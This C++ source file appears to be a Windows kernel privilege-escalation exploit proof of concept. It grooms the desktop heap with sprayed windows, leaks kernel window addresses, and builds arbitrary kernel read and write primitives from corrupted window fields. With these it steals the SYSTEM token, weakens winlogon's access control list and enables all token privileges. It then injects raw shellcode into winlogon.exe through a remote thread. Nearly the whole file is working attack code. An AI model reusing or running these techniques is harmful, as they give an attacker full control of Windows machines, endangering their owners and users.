// Shellcode.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <TlHelp32.h>
#include "ntos.h"


typedef struct _DESKTOPINFO
{
	/* 000 */ PVOID        pvDesktopBase;
	/* 008 */ PVOID        pvDesktopLimit;

} DESKTOPINFO, *PDESKTOPINFO;


typedef struct _CLIENTINFO
{
	/* 000 */ DWORD             CI_flags;
	/* 004 */ DWORD             cSpins;
	/* 008 */ DWORD             dwExpWinVer;
	/* 00c */ DWORD             dwCompatFlags;
	/* 010 */ DWORD             dwCompatFlags2;
	/* 014 */ DWORD             dwTIFlags;
	/* 018 */ DWORD				filler1;
	/* 01c */ DWORD				filler2;
	/* 020 */ PDESKTOPINFO      pDeskInfo;
	/* 028 */ ULONG_PTR         ulClientDelta;

} CLIENTINFO, *PCLIENTINFO;

typedef struct _HANDLEENTRY {
	PVOID  phead;
	ULONG_PTR  pOwner;
	BYTE  bType;
	BYTE  bFlags;
	WORD  wUniq;
}HANDLEENTRY, *PHANDLEENTRY;


typedef struct _SERVERINFO {
	DWORD dwSRVIFlags;
	DWORD64 cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
}SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PHANDLEENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelta;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
}SHAREDINFO, *PSHAREDINFO;

typedef struct _LARGE_UNICODE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;

DWORD64 g_ulClientDelta;
PSHAREDINFO g_pSharedInfo;
PSERVERINFO g_pServerInfo;
HANDLEENTRY* g_UserHandleTable;
DWORD64 g_rpDesk;
PDWORD64 g_fakeDesktop = NULL;
DWORD64 g_winStringAddr;
DWORD64 g_pvDesktopBase;
PBYTE g_fakeFunc;
HWND g_window1 = NULL;
HWND g_window2 = NULL;
HWND g_window3 = NULL;
const WCHAR g_windowClassName1[] = L"Manager_Window";
const WCHAR g_windowClassName2[] = L"Worker_Window";
const WCHAR g_windowClassName3[] = L"Spray_Window";
WNDCLASSEX cls1;
WNDCLASSEX cls2;
WNDCLASSEX cls3;

extern "C" DWORD64 TokenStealingPayload();
extern "C" DWORD64 GetSidt(LPVOID buf);
extern "C" DWORD64 EditAcl();
extern "C" DWORD64 AddPriv();
extern "C" VOID NtUserDefSetText(HWND hwnd, PLARGE_UNICODE_STRING pstrText);

LRESULT CALLBACK WProc1(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (wParam == 0x1234)
	{
		DebugBreak();
		((PDWORD64)0x1a000070)[0] = 0x333333;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc2(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (wParam == 0x1234)
	{
		DebugBreak();
		((PDWORD64)0x1a000070)[0] = 0x111111;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc3(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

VOID RtlInitLargeUnicodeString(PLARGE_UNICODE_STRING plstr, CHAR* psz, UINT cchLimit)
{
	ULONG Length;
	plstr->Buffer = (WCHAR*)psz;
	plstr->bAnsi = FALSE;
	if (psz != NULL)
	{
		plstr->Length = cchLimit;
		plstr->MaximumLength = cchLimit + sizeof(UNICODE_NULL);
	}
	else
	{
		plstr->MaximumLength = 0;
		plstr->Length = 0;
	}
}

BOOL setupLeak()
{
	PTEB			teb = NtCurrentTeb();
	DWORD64 win32client = (DWORD64)teb->Win32ClientInfo;
	PCLIENTINFO pinfo = (PCLIENTINFO)win32client;
	g_ulClientDelta = pinfo->ulClientDelta;
	PDESKTOPINFO pdesktop = pinfo->pDeskInfo;
	g_pvDesktopBase = (DWORD64)pdesktop->pvDesktopBase;
	g_pSharedInfo = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32.dll"), "gSharedInfo");
	g_UserHandleTable = g_pSharedInfo->aheList;
	g_pServerInfo = g_pSharedInfo->psi;

	return TRUE;
}

DWORD64 leakWnd(HWND hwnd)
{
	HWND kernelHandle = NULL;
	DWORD64 kernelAddr = NULL;

	for (int i = 0; i < g_pServerInfo->cHandleEntries; i++)
	{
		kernelHandle = (HWND)(i | (g_UserHandleTable[i].wUniq << 0x10));
		if (kernelHandle == hwnd)
		{
			kernelAddr = (DWORD64)g_UserHandleTable[i].phead;
			break;
		}
	}
	return kernelAddr;
}

DWORD64 leakHeapData(DWORD64 addr)
{
	DWORD64 userAddr = addr - g_ulClientDelta;

	DWORD64 data = *(PDWORD64)userAddr;

	return data;
}

BOOL leakrpDesk(DWORD64 wndAddr)
{
	DWORD64 rpDeskuserAddr = wndAddr - g_ulClientDelta + 0x18;
	g_rpDesk = *(PDWORD64)rpDeskuserAddr;
	return TRUE;
}

BOOL createWnd()
{
	cls1.cbSize = sizeof(WNDCLASSEX);
	cls1.style = 0;
	cls1.lpfnWndProc = WProc1;
	cls1.cbClsExtra = 0;
	cls1.cbWndExtra = 8;
	cls1.hInstance = NULL;
	cls1.hCursor = NULL;
	cls1.hIcon = NULL;
	cls1.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls1.lpszMenuName = NULL;
	cls1.lpszClassName = g_windowClassName1;
	cls1.hIconSm = NULL;

	if (!RegisterClassEx(&cls1))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	cls2.cbSize = sizeof(WNDCLASSEX);
	cls2.style = 0;
	cls2.lpfnWndProc = WProc2;
	cls2.cbClsExtra = 0;
	cls2.cbWndExtra = 8;
	cls2.hInstance = NULL;
	cls2.hCursor = NULL;
	cls2.hIcon = NULL;
	cls2.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls2.lpszMenuName = NULL;
	cls2.lpszClassName = g_windowClassName2;
	cls2.hIconSm = NULL;

	if (!RegisterClassEx(&cls2))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	cls3.cbSize = sizeof(WNDCLASSEX);
	cls3.style = 0;
	cls3.lpfnWndProc = WProc3;
	cls3.cbClsExtra = 0;
	cls3.cbWndExtra = 8;
	cls3.hInstance = NULL;
	cls3.hCursor = NULL;
	cls3.hIcon = NULL;
	cls3.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls3.lpszMenuName = NULL;
	cls3.lpszClassName = g_windowClassName3;
	cls3.hIconSm = NULL;

	if (!RegisterClassEx(&cls3))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	//perform the desktop heap feng shui
	DWORD size = 0x1000;
	HWND* hWnd = new HWND[size];
	for (DWORD i = 0; i < size; i++)
	{
		hWnd[i] = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName3, L"Sprayer", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);
	}

	DestroyWindow(hWnd[0xE00]);

	g_window1 = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName1, L"Manager", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (g_window1 == NULL)
	{
		printf("Failed to create window: %d\n", GetLastError());
		return FALSE;
	}

	DestroyWindow(hWnd[0xE01]);
	g_window2 = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName2, L"Worker", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (g_window2 == NULL)
	{
		printf("Failed to create window: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

VOID setupFakeDesktop()
{
	g_fakeDesktop = (PDWORD64)VirtualAlloc((LPVOID)0x2a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(g_fakeDesktop, 0x11, 0x1000);
}

VOID setupPrimitive()
{
	g_winStringAddr = leakHeapData(leakWnd(g_window2) + 0xe0);
	leakrpDesk(leakWnd(g_window2));
	setupFakeDesktop();
}



DWORD64 readQWORD(DWORD64 addr)
{
	//The top part of the code is to make sure that the address is not odd
	DWORD size = 0x18;
	DWORD offset = addr & 0xF;
	addr -= offset;

	WCHAR* data = new WCHAR[size + 1];
	ZeroMemory(data, size + 1);
	g_fakeDesktop[0xF] = addr - 0x100;
	g_fakeDesktop[0x10] = 0x200;

	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	SetWindowLongPtr(g_window1, 0x118, addr);
	SetWindowLongPtr(g_window1, 0x110, 0x0000002800000020);
	SetWindowLongPtr(g_window1, 0x50, (DWORD64)g_fakeDesktop);

	DWORD res = InternalGetWindowText(g_window2, data, size);

	SetWindowLongPtr(g_window1, 0x50, g_rpDesk);
	SetWindowLongPtr(g_window1, 0x110, 0x0000000e0000000c);
	SetWindowLongPtr(g_window1, 0x118, g_winStringAddr);

	SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

	CHAR* tmp = (CHAR*)data;
	DWORD64 value = *(PDWORD64)((DWORD64)data + offset);

	return value;
}

VOID writeQWORD(DWORD64 addr, DWORD64 value)
{
	//The top part of the code is to make sure that the address is not odd
	DWORD offset = addr & 0xF;
	addr -= offset;
	DWORD64 filler;
	DWORD64 size = 0x8 + offset;
	CHAR* input = new CHAR[size];
	LARGE_UNICODE_STRING uStr;

	if (offset != 0)
	{
		filler = readQWORD(addr);
	}

	for (DWORD i = 0; i < offset; i++)
	{
		input[i] = (filler >> (8 * i)) & 0xFF;
	}

	for (DWORD i = 0; i < 8; i++)
	{
		input[i + offset] = (value >> (8 * i)) & 0xFF;
	}

	RtlInitLargeUnicodeString(&uStr, input, size);

	g_fakeDesktop[0x1] = 0;
	g_fakeDesktop[0xF] = addr - 0x100;
	g_fakeDesktop[0x10] = 0x200;

	SetWindowLongPtr(g_window1, 0x118, addr);
	SetWindowLongPtr(g_window1, 0x110, 0x0000002800000020);
	SetWindowLongPtr(g_window1, 0x50, (DWORD64)g_fakeDesktop);

	NtUserDefSetText(g_window2, &uStr);
	//cleanup
	SetWindowLongPtr(g_window1, 0x50, g_rpDesk);
	SetWindowLongPtr(g_window1, 0x110, 0x0000000e0000000c);
	SetWindowLongPtr(g_window1, 0x118, g_winStringAddr);
}



DWORD64 LeakSidt()
{
	DWORD64 res = SetThreadAffinityMask(GetCurrentThread(), 0x001);
#pragma pack(push, 1)
	struct {
		USHORT limit;
		ULONG64 base;
	} idtr;
#pragma pack(pop)
	GetSidt(&idtr);

	return idtr.base;
}

DWORD64 getKWEAddr()
{
	DWORD64 idtAddr = LeakSidt();
	DWORD64 KWEAddr = idtAddr + 0x1080;
	return KWEAddr;
}

DWORD getProcessId(WCHAR* str)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD PID;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return 0;
	}

	do
	{
		if (!wcscmp(pe32.szExeFile, str))
		{
			PID = pe32.th32ProcessID;
			return PID;
		}
	} while (Process32Next(hProcessSnap, &pe32));
	return 0;
}

BOOL injectCode()
{
	void* pMem;
	WCHAR *str = L"winlogon.exe";
	HANDLE hEx = NULL;
	CHAR shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
		"\x00";

	DWORD pid = getProcessId(str);
	hEx = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hEx == NULL)
	{
		printf("Error opening winlogon process: %d\n", GetLastError());
		return FALSE;
	}
	
	pMem = VirtualAllocEx(hEx, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pMem == NULL)
	{
		printf("Error allocating space in winlogon process: %d\n", GetLastError());
		return FALSE;
	}
	if (!WriteProcessMemory(hEx, pMem, shellcode, sizeof(shellcode), 0))
	{
		printf("Error writing shellcode: %d\n", GetLastError());
		return FALSE;
	}
	if (!CreateRemoteThread(hEx, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL))
	{
		printf("Error starting thread: %d\n", GetLastError());
		return FALSE;
	}
	printf("Remote thread created\n");
	return TRUE;
}

VOID TokenStealDataOnly(DWORD64 tagWND)
{
	DWORD64 pti = readQWORD(tagWND + 0x10);
	DWORD64 kthread = readQWORD(pti);
	DWORD64 eprocess = readQWORD(kthread + 0x220);
	DWORD64 ppid = readQWORD(eprocess + 0x3E0);
	DWORD64 searchEprocess = eprocess;
	while (1)
	{
		searchEprocess = readQWORD(searchEprocess + 0x2F0) - 0x2F0;
		if (readQWORD(searchEprocess + 0x2E8) == ppid)
		{
			break;
		}
	}
	DWORD64 parentEprocess = searchEprocess;
	
	searchEprocess = eprocess;
	while (1)
	{
		searchEprocess = readQWORD(searchEprocess + 0x2F0) - 0x2F0;
		if (readQWORD(searchEprocess + 0x2E8) == 4)
		{
			break;
		}
	}
	DWORD64 systemEprocess = searchEprocess;

	DWORD64 systemToken = readQWORD(systemEprocess + 0x358);
	writeQWORD(parentEprocess + 0x358, systemToken);
}

VOID AclEditDataOnly(DWORD64 tagWND)
{
	DWORD64 pti = readQWORD(tagWND + 0x10);
	DWORD64 kthread = readQWORD(pti);
	DWORD64 eprocess = readQWORD(kthread + 0x220);

	DWORD64 searchEprocess = eprocess;
	while (1)
	{
		searchEprocess = readQWORD(searchEprocess + 0x2F0) - 0x2F0;
		if (readQWORD(searchEprocess + 0x450) == 0x6e6f676f6c6e6977)
		{
			break;
		}
	}
	DWORD64 winlogonEprocess = searchEprocess;

	DWORD64 securityDescriptor = readQWORD(winlogonEprocess - 0x8);
	securityDescriptor = securityDescriptor & 0xFFFFFFFFFFFFFFF0;
	DWORD64 DACL = readQWORD(securityDescriptor + 0x48);
	DACL = (DACL & 0xFFFFFFFFFFFFFF00) + 0xb;
	writeQWORD(securityDescriptor + 0x48, DACL);

	DWORD64 tokenAddr = readQWORD(eprocess + 0x358);
	tokenAddr = tokenAddr & 0xFFFFFFFFFFFFFFF0;
	DWORD64 token = readQWORD(tokenAddr + 0xd0);
	token = token & 0xFFFFFF00FFFFFFFF;
	writeQWORD(tokenAddr + 0xd0, token);
}

VOID AddPrivDataOnly(DWORD64 tagWND)
{
	DWORD64 pti = readQWORD(tagWND + 0x10);
	DWORD64 kthread = readQWORD(pti);
	DWORD64 eprocess = readQWORD(kthread + 0x220);
	DWORD64 ppid = readQWORD(eprocess + 0x3E0);
	DWORD64 searchEprocess = eprocess;
	while (1)
	{
		searchEprocess = readQWORD(searchEprocess + 0x2F0) - 0x2F0;
		if (readQWORD(searchEprocess + 0x2E8) == ppid)
		{
			break;
		}
	}
	DWORD64 parentEprocess = searchEprocess;

	DWORD64 tokenAddr = readQWORD(parentEprocess + 0x358);
	tokenAddr = tokenAddr & 0xFFFFFFFFFFFFFFF0;
	writeQWORD(tokenAddr + 0x48, 0xFFFFFFFFFFFFFFFF);
}

int main()
{
	LoadLibraryA("user32.dll");
	LoadLibraryA("gdi32.dll");
	PDWORD64 debug = (PDWORD64)VirtualAlloc((LPVOID)0x1a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memset(debug, 0, 0x1000);

	createWnd();
	setupLeak();
	setupPrimitive();
	//This is the cbwndExtra field of the first window - manually modify it to simulate a w-w-w, 0x1000 is more than enough.
	debug[4] = leakWnd(g_window1) + 0xe8;

	DWORD64 KWEAddr = getKWEAddr();
	debug[0] = KWEAddr;
	debug[1] = (DWORD64)TokenStealingPayload;
	debug[2] = (DWORD64)EditAcl;
	debug[3] = (DWORD64)AddPriv;

	DebugBreak();
	//TokenStealDataOnly(leakWnd(g_window1));
	//AclEditDataOnly(leakWnd(g_window1));
	//AddPrivDataOnly(leakWnd(g_window1));

	if (!injectCode())
	{
		printf("Could not inject code");
	}

    return 0;
}

